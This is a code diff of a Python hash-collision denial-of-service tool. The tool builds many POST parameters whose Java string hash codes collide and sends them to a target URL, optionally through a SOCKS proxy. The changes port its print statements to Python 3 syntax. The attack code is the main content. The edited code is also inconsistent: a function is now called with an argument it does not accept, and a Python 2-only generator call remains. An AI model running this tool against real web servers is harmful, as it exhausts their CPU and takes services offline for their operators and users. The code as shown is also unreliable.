@@ -1,3 +1,4 @@
+#!/usr/bin/python -3
 """
 DoS through hash table
 ----------------------
@@ -15,6 +16,7 @@ parametri | tempo (s)
 
 ref: http://permalink.gmane.org/gmane.comp.security.full-disclosure/83694
 """
+from __future__ import print_function
 import os
 import optparse
 import random
@@ -25,13 +27,13 @@ import urllib
 def enable_socks4_if_requested():
     proxy = os.getenv("socks_proxy", '')
     if proxy != '':
-        print "enabling SOCKS via {0}".format(proxy)
+        print("enabling SOCKS via {0}".format(proxy))
         addr, port = proxy.split(":")
         import socks4
         socks4.socks4socket.PROXY = (addr, int(port))
         socket.socket = socks4.socks4socket
     else:
-        print "no SOCKS"
+        print("no SOCKS")
         
 def random_permutations(collisions, n, random):
     while True:
@@ -39,7 +41,7 @@ def random_permutations(collisions, n, random):
 
 def generate_random_parameters(collisions, nparams, lparams):
     generator = random_permutations(collisions, lparams, random.Random()) 
-    keys = [ "".join(generator.next()) for i in range(nparams)]
+    keys = ["".join(generator.next()) for i in range(nparams)]
     values = range(nparams)
     return dict(zip(keys, values))
 
@@ -59,10 +61,10 @@ if __name__ == "__main__":
     parameters = generate_random_parameters(collisions, options.nparams, options.lparams)
 
     if options.verbose:
-        print "java.lang.String with same hashcode", collisions
-        print "number of parameters", options.nparams
-        print "length of parameters", options.lparams
-        print "unique parameters", len(parameters) 
+        print("java.lang.String with same hashcode", collisions)
+        print("number of parameters", options.nparams)
+        print("length of parameters", options.lparams)
+        print("unique parameters", len(parameters))
 
     if options.dump:
         for x in parameters.keys(): 
@@ -72,9 +74,9 @@ if __name__ == "__main__":
     if len(args) != 1:
         parser.error("missing target url")
 
-    enable_socks4_if_requested()
+    enable_socks4_if_requested(options.verbose)
     target_url = args[0]
     response_body = post(target_url, parameters)
     if options.verbose:
-        print response_body
+        print(response_body)
 
